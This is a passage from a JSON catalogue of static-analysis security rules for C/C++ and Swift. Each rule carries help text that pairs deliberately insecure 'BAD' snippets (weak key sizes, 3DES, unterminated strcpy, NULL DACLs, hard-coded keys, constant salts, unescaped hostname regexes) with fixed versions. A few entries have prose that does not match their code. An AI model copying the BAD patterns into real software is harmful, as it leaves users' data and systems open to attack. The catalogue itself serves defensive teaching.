    "id": "cpp/insufficient-key-size",
    "tags": [
      "security",
      "external/cwe/cwe-326"
    ],
    "filename": "868abbe2-InsufficientKeySize",
    "language": "cpp",
    "help": "# Use of a cryptographic algorithm with insufficient key size\nUsing cryptographic algorithms with a small key size can leave data vulnerable to being decrypted.\n\nMany cryptographic algorithms provided by cryptography libraries can be configured with key sizes that are vulnerable to brute force attacks. Using such a key size means that an attacker may be able to easily decrypt the encrypted data.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048.\n\n\n## Example\nThe following code shows an example of using the `openssl` library to generate an RSA key. When creating a key, you must specify which key size to use. The first example uses 1024 bits, which is not considered sufficient. The second example uses 2048 bits, which is currently considered sufficient.\n\n\n```c\nvoid encrypt_with_openssl(EVP_PKEY_CTX *ctx) {\n\n  // BAD: only 1024 bits for an RSA key\n  EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 1024);\n\n  // GOOD: 2048 bits for an RSA key\n  EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048);\n}\n```\n\n## References\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf).\n* Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).\n"
  },
  "cpp/weak-cryptographic-algorithm": {
    "name": "Use of a broken or risky cryptographic algorithm",
    "description": "Using broken or weak cryptographic algorithms can allow an attacker to compromise security.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "cpp/weak-cryptographic-algorithm",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "e533579b-BrokenCryptoAlgorithm",
    "language": "cpp",
    "help": "# Use of a broken or risky cryptographic algorithm\nUsing broken or weak cryptographic algorithms can leave data vulnerable to being decrypted.\n\nMany cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that an attacker may be able to easily decrypt the encrypted data.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048.\n\n\n## Example\nThe following code shows an example of using the `advapi` windows API to decrypt some data. When creating a key, you must specify which algorithm to use. The first example uses DES which is an older algorithm that is now considered weak. The second example uses AES, which is a strong modern algorithm.\n\n\n```c\nvoid advapi() {\n  HCRYPTPROV hCryptProv;\n  HCRYPTKEY hKey;\n  HCRYPTHASH hHash;\n  // other preparation goes here\n\n  // BAD: use 3DES for key\n  CryptDeriveKey(hCryptProv, CALG_3DES, hHash, 0, &hKey);\n\n  // GOOD: use AES\n  CryptDeriveKey(hCryptProv, CALG_AES_256, hHash, 0, &hKey);\n}\n\n\n```\n\n## References\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "cpp/user-controlled-null-termination-tainted": {
    "name": "User-controlled data may not be null terminated",
    "description": "String operations on user-controlled strings can result in buffer overflow or buffer over-read.",
    "kind": "problem",
    "id": "cpp/user-controlled-null-termination-tainted",
    "problem.severity": "warning",
    "security-severity": 10.0,
    "tags": [
      "security",
      "external/cwe/cwe-170"
    ],
    "filename": "7ab85562-ImproperNullTerminationTainted",
    "language": "cpp",
    "help": "# User-controlled data may not be null terminated\nBuilt-in C string functions such as `strcpy` require that their input string arguments are null terminated. If the input string arguments are not null terminated, these functions will read/write beyond the length of the buffer containing the string, resulting in either buffer over-read or buffer overflow, respectively.\n\n\n## Recommendation\nAlways guard against user-controlled strings that may not be null terminated. Otherwise, an attacker may be able to supply input without null termination.\n\n\n## Example\nIn this example, a string is read from a file using the `read` function. Because the value may be user-controlled, the string may not be null terminated, in which case the call to `strcpy` will perform a buffer overwrite on `cpy`, potentially resulting in a program crash.\n\n\n```cpp\nchar buf[BUF_SIZE];\nread(fd, buf, BUF_SIZE);\nchar cpy[BUF_SIZE];\nstrcpy(cpy, buf);\n```\nIn the revised example, the number of bytes read is recorded in the variable `count`. In addition to checking that the read succeeds (the condition `count >= 0`), a null terminator is inserted before the call to `strcpy`.\n\n\n```cpp\nchar buf[BUF_SIZE];\nint count = read(fd, buf, BUF_SIZE);\nif (count >= 0) {\n  buf[count < BUF_SIZE ? count : BUF_SIZE - 1] = '\\0';\n  char cpy[BUF_SIZE];\n  strcpy(cpy, buf);\n}\n```\n\n## References\n* B. Chess and J. West, *Secure Programming with Static Analysis*, 6.2 Maintaining the Null Terminator. Addison-Wesley. 2007.\n* Linux Programmer's Manual: [READ(2)](http://man7.org/linux/man-pages/man2/read.2.html), [STRCPY(3)](http://man7.org/linux/man-pages/man3/strncpy.3.html).\n* Common Weakness Enumeration: [CWE-170](https://cwe.mitre.org/data/definitions/170.html).\n"
  },
  "cpp/crypto-primitive": {
    "name": "Implementation of a cryptographic primitive",
    "description": "Writing your own cryptographic primitives is prone to errors and omissions that weaken cryptographic protection.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "cpp/crypto-primitive",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-1240"
    ],
    "filename": "cbaaa8b2-CustomCryptographicPrimitive",
    "language": "cpp"
  },
  "cpp/drop-linux-privileges-outoforder": {
    "name": "LinuxPrivilegeDroppingOutoforder",
    "description": "A syscall commonly associated with privilege dropping is being called out of order. Normally a process drops group ID and sets supplemental groups for the target user before setting the target user ID. This can have security impact if the return code from these methods is not checked.",
    "kind": "problem",
    "problem.severity": "recommendation",
    "id": "cpp/drop-linux-privileges-outoforder",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-273"
    ],
    "precision": "medium",
    "filename": "676d3662-PrivilegeDroppingOutoforder",
    "language": "cpp",
    "help": "# LinuxPrivilegeDroppingOutoforder\nThe code attempts to drop privilege in an incorrect order by erroneous dropping user privilege before groups. This has security impact if the return codes are not checked.\n\nFalse positives include code performing negative checks, making sure that setgid or setgroups does not work, meaning permissions are dropped. Additionally, other forms of sandboxing may be present removing any residual risk, for example a dedicated user namespace.\n\n\n## Recommendation\nSet the new group ID, then set the target user's intended groups by dropping previous supplemental source groups and initializing target groups, and finally set the target user.\n\n\n## Example\nThe following example demonstrates out of order calls.\n\n\n```c\n#include <stdlib.h>\n#include <sys/param.h>\n#include <unistd.h>\n#include <pwd.h>\n\nvoid callSetuidAndCheck(int uid) {\n    if (setuid(uid) != 0) {\n        exit(1);\n    }\n}\n\nvoid callSetgidAndCheck(int gid) {\n    if (setgid(gid) != 0) {\n        exit(1);\n    }\n}\n\n/// Correct ways to drop priv.\n\nvoid correctDropPrivInline() {\n    if (setgroups(0, NULL)) {\n        exit(1);\n    }\n\n    if (setgid(-2) != 0) {\n        exit(1);\n    }\n\n    if (setuid(-2) != 0) {\n        exit(1);\n    }\n}\n\nvoid correctDropPrivInScope() {\n    {\n        if (setgroups(0, NULL)) {\n            exit(1);\n        }\n    }\n\n    {\n        if (setgid(-2) != 0) {\n            exit(1);\n        }\n    }\n\n    {\n        if (setuid(-2) != 0) {\n            exit(1);\n        }\n    }\n}\n\nvoid correctOrderForInitgroups() {\n    struct passwd *pw = getpwuid(0);\n    if (pw) {\n        if (initgroups(pw->pw_name, -2)) {\n            exit(1);\n        }\n    } else {\n        // Unhandled.\n    }\n    int rc = setuid(-2);\n    if (rc) {\n        exit(1);\n    }\n}\n\nvoid correctDropPrivInScopeParent() {\n    {\n        callSetgidAndCheck(-2);\n    }\n    correctOrderForInitgroups();\n}\n\nvoid incorrectNoReturnCodeCheck() {\n    int user = -2;\n    if (user) {\n        if (user) {\n            int rc = setgid(user);\n            (void)rc;\n            initgroups(\"nobody\", user);\n        }\n        if (user) {\n            setuid(user);\n        }\n    }\n}\n\nvoid correctDropPrivInFunctionCall() {\n    if (setgroups(0, NULL)) {\n        exit(1);\n    }\n\n    callSetgidAndCheck(-2);\n    callSetuidAndCheck(-2);\n}\n\n/// Incorrect, out of order gid and uid.\n/// Calling uid before gid will fail.\n\nvoid incorrectDropPrivOutOfOrderInline() {\n    if (setuid(-2) != 0) {\n        exit(1);\n    }\n\n    if (setgid(-2) != 0) {\n        exit(1);\n    }\n}\n\nvoid incorrectDropPrivOutOfOrderInScope() {\n    {\n        if (setuid(-2) != 0) {\n            exit(1);\n        }\n    }\n\n    setgid(-2);\n}\n\nvoid incorrectDropPrivOutOfOrderWithFunction() {\n    callSetuidAndCheck(-2);\n\n    if (setgid(-2) != 0) {\n        exit(1);\n    }\n}\n\nvoid incorrectDropPrivOutOfOrderWithFunction2() {\n    callSetuidAndCheck(-2);\n    callSetgidAndCheck(-2);\n}\n\nvoid incorrectDropPrivNoCheck() {\n    setgid(-2);\n    setuid(-2);\n}\n\n```\n\n## References\n* CERT C Coding Standard: [POS36-C. Observe correct revocation order while relinquishing privileges](https://wiki.sei.cmu.edu/confluence/display/c/POS36-C.+Observe+correct+revocation+order+while+relinquishing+privileges).\n* CERT C Coding Standard: [POS37-C. Ensure that privilege relinquishment is successful](https://wiki.sei.cmu.edu/confluence/display/c/POS37-C.+Ensure+that+privilege+relinquishment+is+successful).\n* Common Weakness Enumeration: [CWE-273](https://cwe.mitre.org/data/definitions/273.html).\n"
  },
  "cpp/potential-system-data-exposure": {
    "name": "Potential exposure of sensitive system data to an unauthorized control sphere",
    "description": "Exposing sensitive system data helps a malicious user learn about the system and form an attack plan.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "precision": "medium",
    "id": "cpp/potential-system-data-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-497"
    ],
    "filename": "bb987e2b-PotentiallyExposedSystemData",
    "language": "cpp",
    "help": "# Potential exposure of sensitive system data to an unauthorized control sphere\nExposing system data or debugging information may help a malicious user learn about the system and form an attack plan. An attacker can use error messages that reveal technologies, operating systems, and product versions to tune their attack against known vulnerabilities in the software.\n\nThis query finds locations where system configuration information that is particularly sensitive might be revealed to a user.\n\n\n## Recommendation\nDo not expose system configuration information to users. Be wary of the difference between information that could be helpful to users, and unnecessary details that could be useful to a malicious user.\n\n\n## Example\nIn this example the value of the `PATH` environment variable is revealed in full to the user when a particular error occurs. This might reveal information such as the software installed on your system to a malicious user who does not have legitimate access to that information.\n\n\n```cpp\nchar* key = getenv(\"APP_KEY\");\n\n//...\n\nfprintf(stderr, \"Key not recognized: %s\\n\", key);\n```\nThe message should be rephrased without this information, for example:\n\n\n```cpp\nchar* key = getenv(\"APP_KEY\");\n\n//...\n\nfprintf(stderr, \"Application key not recognized. Please ensure the key is correct or contact a system administrator.\\n\", key);\n```\n\n## References\n* Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).\n"
  },
  "cpp/tainted-permissions-check": {
    "name": "Untrusted input for a condition",
    "description": "Using untrusted inputs in a statement that makes a security decision makes code vulnerable to attack.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "cpp/tainted-permissions-check",
    "tags": [
      "security",
      "external/cwe/cwe-807"
    ],
    "filename": "ca538e3a-TaintedCondition",
    "language": "cpp",
    "help": "# Untrusted input for a condition\nThis rule finds code where untrusted inputs are used in an `if` statement, and the body of that statement makes a security decision. This is an example of CWE-807 and makes the program vulnerable to attack. An attacker might be able to gain unauthorized access to the system by manipulating external inputs to the system.\n\n\n## Recommendation\nIn most cases, you need to add or strengthen the checks made on the user-supplied data to ensure its integrity. The user-supplied data can then be used as a trusted input to the security decision. For example, instead of checking an HTTP cookie against a predictable fixed string, check a cookie against a randomly generated session key.\n\nThis rule may highlight a few conditions where user-supplied data has been checked and can be trusted. It is not always possible to determine if the checks applied to data are enough to ensure security.\n\n\n## Example\nThe following example is included in CWE 807.\n\n\n```c\nstruct hostent *hp;struct in_addr myaddr;\nchar* tHost = \"trustme.example.com\";\nmyaddr.s_addr=inet_addr(ip_addr_string);\n\nhp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);\nif (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {\n  trusted = true;\n} else {\n  trusted = false;\n}\n\n```\nIn this example, the result of a reverse DNS query is compared against a fixed string. An attacker can return an incorrect reverse DNS entry for the requesting IP and thus gain the same access as a legitimate user from `trustme.example.com`.\n\nTo fix the problem in this example, you need to add an additional mechanism to test the user-supplied data. For example, numeric IP addresses could be used.\n\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n"
  },
  "cpp/unsafe-dacl-security-descriptor": {
    "name": "Setting a DACL to NULL in a SECURITY_DESCRIPTOR",
    "description": "Setting a DACL to NULL in a SECURITY_DESCRIPTOR will result in an unprotected object. If the DACL that belongs to the security descriptor of an object is set to NULL, a null DACL is created. A null DACL grants full access to any user who requests it; normal security checking is not performed with respect to the object.",
    "id": "cpp/unsafe-dacl-security-descriptor",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-732"
    ],
    "filename": "71e366af-UnsafeDaclSecurityDescriptor",
    "language": "cpp",
    "help": "# Setting a DACL to NULL in a SECURITY_DESCRIPTOR\nThis query indicates that a call is setting the DACL field in a `SECURITY_DESCRIPTOR` to null.\n\nWhen using `SetSecurityDescriptorDacl` to set a discretionary access control (DACL), setting the `bDaclPresent` argument to `TRUE` indicates the presence of a DACL in the security description in the argument `pDacl`.\n\nWhen the `pDacl` parameter does not point to a DACL (i.e. it is `NULL`) and the `bDaclPresent` flag is `TRUE`, a `NULL DACL` is specified.\n\nA `NULL DACL` grants full access to any user who requests it; normal security checking is not performed with respect to the object.\n\n\n## Recommendation\nYou should not use a `NULL DACL` with an object because any user can change the DACL and owner of the security descriptor.\n\n\n## Example\nIn the following example, the call to `SetSecurityDescriptorDacl` is setting an unsafe DACL (`NULL DACL`) to the security descriptor.\n\n\n```cpp\nSECURITY_DESCRIPTOR  pSD;\nSECURITY_ATTRIBUTES  SA;\n\nif (!InitializeSecurityDescriptor(&pSD, SECURITY_DESCRIPTOR_REVISION))\n{\n    // error handling\n}\nif (!SetSecurityDescriptorDacl(&pSD,\n    TRUE,   // bDaclPresent - this value indicates the presence of a DACL in the security descriptor\n    NULL,   // pDacl - the pDacl parameter does not point to a DACL. All access will be allowed\n    FALSE))\n{\n    // error handling\n}\n\n```\nTo fix this issue, `pDacl` argument should be a pointer to an `ACL` structure that specifies the DACL for the security descriptor.\n\n\n## References\n* [SetSecurityDescriptorDacl function (Microsoft documentation).](https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-setsecuritydescriptordacl)\n* Common Weakness Enumeration: [CWE-732](https://cwe.mitre.org/data/definitions/732.html).\n"
  },
  "cpp/iterator-to-expired-container": {
    "name": "Iterator to expired container",
    "description": "Using an iterator owned by a container whose lifetime has expired may lead to unexpected behavior.",
    "kind": "problem",
    "precision": "high",
    "id": "cpp/iterator-to-expired-container",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-416",
      "external/cwe/cwe-664"
    ],
    "filename": "dbf806fe-IteratorToExpiredContainer",
    "language": "cpp",
    "help": "# Iterator to expired container\nUsing an iterator owned by a container after the lifetime of the container has expired can lead to undefined behavior. This is because the iterator may be invalidated when the container is destroyed, and dereferencing an invalidated iterator is undefined behavior. These problems can be hard to spot due to C++'s complex rules for temporary object lifetimes and their extensions.\n\n\n## Recommendation\nNever create an iterator to a temporary container when the iterator is expected to be used after the container's lifetime has expired.\n\n\n## Example\n\n\nThe rules for lifetime extension ensures that the code in `lifetime_of_temp_extended` is well-defined. This is because the lifetime of the temporary container returned by `get_vector` is extended to the end of the loop. However, prior to C++23, the lifetime extension rules do not ensure that the container returned by `get_vector` is extended in `lifetime_of_temp_not_extended`. This is because the temporary container is not bound to a rvalue reference.\n\n\n```cpp\n#include <vector>\n\nstd::vector<int> get_vector();\n\nvoid use(int);\n\nvoid lifetime_of_temp_extended() {\n  for(auto x : get_vector()) {\n    use(x); // GOOD: The lifetime of the vector returned by `get_vector()` is extended until the end of the loop.\n  }\n}\n\n// Writes the the values of `v` to an external log and returns it unchanged.\nconst std::vector<int>& log_and_return_argument(const std::vector<int>& v);\n\nvoid lifetime_of_temp_not_extended() {\n  for(auto x : log_and_return_argument(get_vector())) {\n    use(x); // BAD: The lifetime of the vector returned by `get_vector()` is not extended, and the behavior is undefined.\n  }\n}\n\n```\nTo fix `lifetime_of_temp_not_extended`, consider rewriting the code so that the lifetime of the temporary object is extended. In `fixed_lifetime_of_temp_not_extended`, the lifetime of the temporary object has been extended by storing it in an rvalue reference.\n\n\n```cpp\nvoid fixed_lifetime_of_temp_not_extended() {\n  auto&& v = get_vector();\n  for(auto x : log_and_return_argument(v)) {\n    use(x); // GOOD: The lifetime of the container returned by `get_vector()` has been extended to the lifetime of `v`.\n  }\n}\n\n```\n\n## References\n* CERT C Coding Standard: [MEM30-C. Do not access freed memory](https://wiki.sei.cmu.edu/confluence/display/c/MEM30-C.+Do+not+access+freed+memory).\n* OWASP: [Using freed memory](https://owasp.org/www-community/vulnerabilities/Using_freed_memory).\n* [Lifetime safety: Preventing common dangling](https://github.com/isocpp/CppCoreGuidelines/blob/master/docs/Lifetime.pdf)\n* [Containers library](https://en.cppreference.com/w/cpp/container)\n* [Range-based for loop (since C++11)](https://en.cppreference.com/w/cpp/language/range-for)\n* Common Weakness Enumeration: [CWE-416](https://cwe.mitre.org/data/definitions/416.html).\n* Common Weakness Enumeration: [CWE-664](https://cwe.mitre.org/data/definitions/664.html).\n"
  },
  "cpp/suspicious-add-sizeof": {
    "name": "Suspicious add with sizeof",
    "description": "Explicitly scaled pointer arithmetic expressions can cause buffer overflow conditions if the offset is also implicitly scaled.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "high",
    "id": "cpp/suspicious-add-sizeof",
    "tags": [
      "security",
      "external/cwe/cwe-468"
    ],
    "filename": "94152eed-SuspiciousAddWithSizeof",
    "language": "cpp",
    "help": "# Suspicious add with sizeof\nPointer arithmetic in C and C++ is automatically scaled according to the size of the data type. For example, if the type of `p` is `T*` and `sizeof(T) == 4` then the expression `p+1` adds 4 bytes to `p`.\n\nThis query finds code of the form `p + k*sizeof(T)`. Such code is usually a mistake because there is no need to manually scale the offset by `sizeof(T)`.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `char*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nint example1(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // BAD: the offset is already automatically scaled by sizeof(int),\n  // so this code will compute the wrong offset.\n  return *(intPointer + (i * sizeof(int)));\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n"
  },
  "cpp/errors-of-undefined-program-behavior": {
    "name": "Errors Of Undefined Program Behavior",
    "description": "--In some situations, the code constructs used may be executed in the wrong order in which the developer designed them. --For example, if you call multiple functions as part of a single expression, and the functions have the ability to modify a shared resource, then the sequence in which the resource is changed can be unpredictable. --These code snippets look suspicious and require the developer's attention.",
    "kind": "problem",
    "id": "cpp/errors-of-undefined-program-behavior",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-758"
    ],
    "filename": "f4fdf370-UndefinedOrImplementationDefinedBehavior",
    "language": "cpp",
    "help": "# Errors Of Undefined Program Behavior\nIn some situations, the code constructs used may be executed in the wrong order in which the developer designed them. For example, if you call multiple functions as part of a single expression, and the functions have the ability to modify a shared resource, then the sequence in which the resource is changed can be unpredictable. These code snippets look suspicious and require the developer's attention.\n\n\n## Recommendation\nWe recommend that you use more guaranteed, in terms of sequence of execution, coding techniques.\n\n\n## Example\nThe following example demonstrates sections of code with insufficient execution sequence definition.\n\n\n```c\nintA = ++intA + 1; // BAD: undefined behavior when changing variable `intA`\n...\nintA++;\nintA = intA + 1; // GOOD: correct design\n...\nchar * buff;\n...\nif(funcAdd(buff)+fucDel(buff)>0) return 1; // BAD: undefined behavior when calling functions to change the `buff` variable\n...\nintA = funcAdd(buff);\nintB = funcDel(buff);\nif(intA+intB>0) return 1; // GOOD: correct design\n```\n\n## References\n* CWE Common Weakness Enumeration: [ EXP10-C. Do not depend on the order of evaluation of subexpressions or the order in which side effects take place](https://wiki.sei.cmu.edu/confluence/display/c/EXP10-C.+Do+not+depend+on+the+order+of+evaluation+of+subexpressions+or+the+order+in+which+side+effects+take+place).\n* Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).\n"
  },
  "swift/constant-salt": {
    "name": "Use of constant salts",
    "description": "Using constant salts for password hashing is not secure because potential attackers can precompute the hash value via dictionary attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/constant-salt",
    "tags": [
      "security",
      "external/cwe/cwe-760"
    ],
    "filename": "c844bd95-ConstantSalt",
    "language": "swift",
    "help": "# Use of constant salts\nConstant salts should not be used for password hashing. Data hashed using constant salts are vulnerable to dictionary attacks, enabling attackers to recover the original input.\n\n\n## Recommendation\nUse randomly generated salts to securely hash input data.\n\n\n## Example\nThe following example shows a few cases of hashing input data. In the 'BAD' cases, the salt is constant, making the generated hashes vulnerable to dictionary attacks. In the 'GOOD' cases, the salt is randomly generated, which protects the hashed data against recovery.\n\n\n```swift\n\nfunc encrypt(padding : Padding) {\n\t// ...\n\n\t// BAD: Using constant salts for hashing\n\tlet badSalt: Array<UInt8> = [0x2a, 0x3a, 0x80, 0x05]\n\tlet randomArray = (0..<10).map({ _ in UInt8.random(in: 0...UInt8.max) })\n\t_ = try HKDF(password: randomArray, salt: badSalt, info: randomArray, keyLength: 0, variant: Variant.sha2)\n\t_ = try PKCS5.PBKDF1(password: randomArray, salt: badSalt, iterations: 120120, keyLength: 0)\n\t_ = try PKCS5.PBKDF2(password: randomArray, salt: badSalt, iterations: 120120, keyLength: 0)\n\t_ = try Scrypt(password: randomArray, salt: badSalt, dkLen: 64, N: 16384, r: 8, p: 1)\n\n\t// GOOD: Using randomly generated salts for hashing\n\tlet goodSalt = (0..<10).map({ _ in UInt8.random(in: 0...UInt8.max) })\n\tlet randomArray = (0..<10).map({ _ in UInt8.random(in: 0...UInt8.max) })\n\t_ = try HKDF(password: randomArray, salt: goodSalt, info: randomArray, keyLength: 0, variant: Variant.sha2)\n\t_ = try PKCS5.PBKDF1(password: randomArray, salt: goodSalt, iterations: 120120, keyLength: 0)\n\t_ = try PKCS5.PBKDF2(password: randomArray, salt: goodSalt, iterations: 120120, keyLength: 0)\n\t_ = try Scrypt(password: randomArray, salt: goodSalt, dkLen: 64, N: 16384, r: 8, p: 1)\n\n\t// ...\n}\n\n```\n\n## References\n* [What are Salted Passwords and Password Hashing?](https://www.okta.com/blog/2019/03/what-are-salted-passwords-and-password-hashing/)\n* Common Weakness Enumeration: [CWE-760](https://cwe.mitre.org/data/definitions/760.html).\n"
  },
  "swift/uncontrolled-format-string": {
    "name": "Uncontrolled format string",
    "description": "Using external input in format strings can lead to exceptions or information leaks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "swift/uncontrolled-format-string",
    "tags": [
      "security",
      "external/cwe/cwe-134"
    ],
    "filename": "38feb146-UncontrolledFormatString",
    "language": "swift",
    "help": "# Uncontrolled format string\nPassing untrusted format strings to functions that use `printf` style formatting can lead to buffer overflows and data representation problems. An attacker may be able to exploit this weakness to crash the program or obtain sensitive information from its internal state.\n\n\n## Recommendation\nUse a constant string literal for the format string to prevent the possibility of data flow from an untrusted source. This also helps to prevent errors where the format arguments do not match the format string.\n\nIf the format string cannot be constant, ensure that it comes from a secure data source or is compiled into the source code. If you need to include a string value from the user, use an appropriate specifier (such as `%@`) in the format string and include the user provided value as a format argument.\n\n\n## Example\nIn this example, the format string includes a user-controlled `inputString`:\n\n\n```swift\n\nprint(String(format: \"User input: \" + inputString)) // vulnerable\n\n```\nTo fix it, make `inputString` a format argument rather than part of the format string, as in the following code:\n\n\n```swift\n\nprint(String(format: \"User input: %@\", inputString)) // fixed\n\n```\n\n## References\n* OWASP: [Format string attack](https://owasp.org/www-community/attacks/Format_string_attack).\n* Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).\n"
  },
  "swift/hardcoded-key": {
    "name": "Hard-coded encryption key",
    "description": "Using hardcoded keys for encryption is not secure, because potential attackers can easily guess them.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.1,
    "precision": "high",
    "id": "swift/hardcoded-key",
    "tags": [
      "security",
      "external/cwe/cwe-321"
    ],
    "filename": "5a3a45fe-HardcodedEncryptionKey",
    "language": "swift",
    "help": "# Hard-coded encryption key\nHardcoded keys should not be used for creating encryption ciphers. Data encrypted using hardcoded keys are more vulnerable to the possibility of recovering them.\n\n\n## Recommendation\nUse randomly generated key material to initialize the encryption cipher.\n\n\n## Example\nThe following example shows a few cases of instantiating a cipher with various encryption keys. In the 'BAD' cases, the key material is hardcoded, making the encrypted data vulnerable to recovery. In the 'GOOD' cases, the key material is randomly generated and not hardcoded, which protects the encrypted data against recovery.\n\n\n```swift\n\nfunc encrypt(padding : Padding) {\n\t// ...\n\n\t// BAD: Using hardcoded keys for encryption\n\tlet key: Array<UInt8> = [0x2a, 0x3a, 0x80, 0x05]\n\tlet keyString = \"this is a constant string\"\n\tlet ivString = getRandomIV()\n\t_ = try AES(key: key, blockMode: CBC(AES.randomIV(AES.blockSize)), padding: padding)\n\t_ = try AES(key: keyString, iv: ivString)\n\t_ = try Blowfish(key: key, blockMode: CBC(Blowfish.randomIV(Blowfish.blockSize)), padding: padding)\n\t_ = try Blowfish(key: keyString, iv: ivString)\n\n\n\t// GOOD: Using randomly generated keys for encryption\n\tvar key = [Int8](repeating: 0, count: 10)\n\tlet status = SecRandomCopyBytes(kSecRandomDefault, key.count - 1, &key)\n\tif status == errSecSuccess {\n\t\tlet keyString = String(cString: key)\n\t\tlet ivString = getRandomIV()\n\t\t_ = try AES(key: key, blockMode: CBC(AES.randomIV(AES.blockSize)), padding: padding)\n\t\t_ = try AES(key: keyString, iv: ivString)\n\t\t_ = try Blowfish(key: key, blockMode: CBC(Blowfish.randomIV(Blowfish.blockSize)), padding: padding)\n\t\t_ = try Blowfish(key: keyString, iv: ivString)\n\t}\n\n\t// ...\n}\n\n```\n\n## References\n* OWASP: [Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n"
  },
  "swift/incomplete-hostname-regexp": {
    "name": "Incomplete regular expression for hostnames",
    "description": "Matching a URL or hostname against a regular expression that contains an unescaped dot as part of the hostname may match more hostnames than expected.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "swift/incomplete-hostname-regexp",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "1acdb811-IncompleteHostnameRegex",
    "language": "swift",
    "help": "# Incomplete regular expression for hostnames\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nIf a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping the `.` meta-characters appropriately. Even if the check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when it accidentally succeeds.\n\n\n## Recommendation\nEscape all meta-characters appropriately when constructing regular expressions for security checks, and pay special attention to the `.` meta-character.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.\n\n\n```\n\nfunc handleUrl(_ urlString: String) {\n    // get the 'url=' parameter from the URL\n    let components = URLComponents(string: urlString)\n    let redirectParam = components?.queryItems?.first(where: { $0.name == \"url\" })\n\n    // check we trust the host\n    let regex = #/^(www|beta).example.com//#  // BAD\n    if let match = redirectParam?.value?.firstMatch(of: regex) {\n        // ... trust the URL ...\n    }\n}\n\n```\nThe check is, however, easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.\n\nAddress this vulnerability by escaping `.` to `\\.`:\n\n\n```\n\nfunc handleUrl(_ urlString: String) {\n    // get the 'url=' parameter from the URL\n    let components = URLComponents(string: urlString)\n    let redirectParam = components?.queryItems?.first(where: { $0.name == \"url\" })\n\n    // check we trust the host\n    let regex = #/^(www|beta)\\.example\\.com//#  // GOOD\n    if let match = redirectParam?.value?.firstMatch(of: regex) {\n        // ... trust the URL ...\n    }\n}\n\n```\n\n## References\n* OWASP: [Server Side Request 